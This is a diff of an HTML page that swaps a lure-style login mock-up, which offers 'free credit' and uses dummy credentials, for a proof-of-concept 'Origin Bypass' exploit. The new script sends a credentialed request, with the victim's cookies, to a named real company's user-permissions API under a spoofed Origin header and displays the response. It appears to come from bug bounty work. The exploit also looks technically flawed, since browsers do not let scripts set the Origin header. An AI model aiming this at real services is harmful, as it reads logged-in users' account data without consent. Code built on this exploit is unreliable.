@@ -1,129 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>DIFM Free Install Pilot +</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: #89CFF0; /* baby blue */
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-
-    .top-left {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      font-size: 14px;
-      color: #333;
-      display: flex;
-      align-items: center;
-    }
-
-    .ring {
-      width: 12px;
-      height: 12px;
-      border: 2px solid #007bff;
-      border-radius: 50%;
-      margin-right: 8px;
-    }
-
-    .main-container {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .login-container {
-      background: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
-      width: 350px;
-    }
-
-    .login-container h2 {
-      margin-bottom: 10px;
-      text-align: center;
-      color: #333;
-    }
-
-    .login-container .subtext {
-      text-align: center;
-      margin-bottom: 20px;
-      color: #555;
-      font-size: 14px;
-    }
-
-    .login-container input[type="text"],
-    .login-container input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-    }
-
-    .login-container button {
-      width: 100%;
-      padding: 12px;
-      background: #007bff;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    .login-container button:hover {
-      background: #0056b3;
-    }
-
-    .error-message {
-      color: red;
-      font-size: 14px;
-      text-align: center;
-      display: none;
-      margin-top: 10px;
-    }
-  </style>
-</head>
+<html>
 <body>
-  <div class="top-left">
-    <div class="ring"></div>
-    Powered by Ring
-  </div>
+<h2>Origin Bypass PoC</h2>
+<button onclick="exploit()">Exploit</button>
 
-  <div class="main-container">
-    <div class="login-container">
-      <h2>DIFM Free Install Pilot +</h2>
-      <div class="subtext">Free credit $2000 </div>
-      hackerone-0ximhotep
-      <button onclick="login()">Login</button>
-      <div class="error-message" id="errorMsg">Invalid email or password</div>
-    </div>
-  </div>
-
-  <script>
-    function login() {
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value.trim();
-
-      // Dummy credentials
-      const validEmail = "admin@example.com";
-      const validPass = "123456";
-
-      if (email === validEmail && password === validPass) {
-        alert("Login successful!");
-        window.location.href = "dashboard.html";
-      } else {
-        document.getElementById("errorMsg").style.display = "block";
-      }
-    }
-  </script>
-</body><h1>0ximhotep</h1>
+<script>
+function exploit() {
+    fetch("https://learn.acronis.com/api/platform/v1/users/me/permissions", {
+        method: "GET",
+        credentials: "include", // send cookies/session
+        headers: {
+            "Origin": "https://ontechsmarthomeservices.com" // your bypass origin
+        }
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log("Sensitive Data:", data);
+        alert("Data: " + data);
+    })
+    .catch(err => console.error("Exploit failed:", err));
+}
+</script>
+</body>
 </html>
